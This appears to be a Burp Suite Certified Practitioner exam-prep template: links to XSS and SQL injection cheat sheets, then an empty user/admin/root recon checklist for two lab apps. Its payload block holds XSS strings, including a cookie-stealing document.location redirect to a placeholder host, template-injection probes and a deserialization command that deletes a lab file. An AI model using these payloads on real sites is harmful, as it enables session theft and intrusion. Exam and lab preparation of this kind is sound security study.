
# Template V3 BSCP

### Reference Links

- [Cyber chef](https://gchq.github.io/CyberChef/)
- [Edra xss](https://github.com/Edr4/XSS-Bypass-Filters)
- [Cross-Site Scripting (XSS) Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [[Cheat Sheet - Cookie Stealer 🍪]]
- [[Cheat Sheet RCE]]
- [[BSCP.excalidraw]]
- Eliminator template
### Payloads

SSRF -> locahost on port 6566
```html
${{<[%'"}}%\]>
<>\"/'\\&;=(){}[]+-!#%` 
<img src=x onerror=${{7*7}}>
<img src=x onerror=alert(0)>
<img src=x onerror=fetch('TODO')>
<img src=x onerror=document.location='TODO'?c='+document.cookie>
/?_proto__proto__=transport_url:data: CommonsCollections4 'rm /home/carlos/morale.txt' | base64
<>\'\"<script>{{7*7}}$(alert(1)}"-prompt(69)-"fuzzer
```

- - -
- - -
- - -
## APP 1
### **User - TODO** Access any user account App 1
#####  features 🏹:  
- Forgot Password ? 
- Search Bar ? 
- Login function ?
- Comment Blog ?
#### 👁️ Recon / Test :





- - -
### **Admin - TODO** - Use your user account to access the admin interface, perhaps by elevating your privileges or compromising the administrator account

##### New features 🏹:  
- New token ? ;)
- Advanced research ? 

#### 👁️ Recon / Test :



- - -
### **Root - TODO** - Use the admin interface to read the contents of `/home/carlos/secret` from the server's filesystem, and submit it using "submit solution"
#####  Features on the admin panel  🏹:  
- Delete user 
- ... 
- Image source ? 

#### 👁️ Recon / Test :



- - -
- - -
- - -

## APP 2
### **User - TODO** Access any user account App 2
#####  features 🏹:  
- Forgot Password ? 
- Search Bar ? 
- Login function ?
- Comment Blog ?
#### 👁️ Recon / Test :





- - -
### **Admin - TODO** - Use your user account to access the admin interface, perhaps by elevating your privileges or compromising the administrator account

##### New features 🏹:  
- New token ? ;)
- Advanced research ? 

#### 👁️ Recon / Test :



- - -
### **Root - TODO** - Use the admin interface to read the contents of `/home/carlos/secret` from the server's filesystem, and submit it using "submit solution"
#####  Features on the admin panel  🏹:  
- Delete user 
- ... 
- Image source ? 

#### 👁️ Recon / Test :



- - -
- - - -
- - -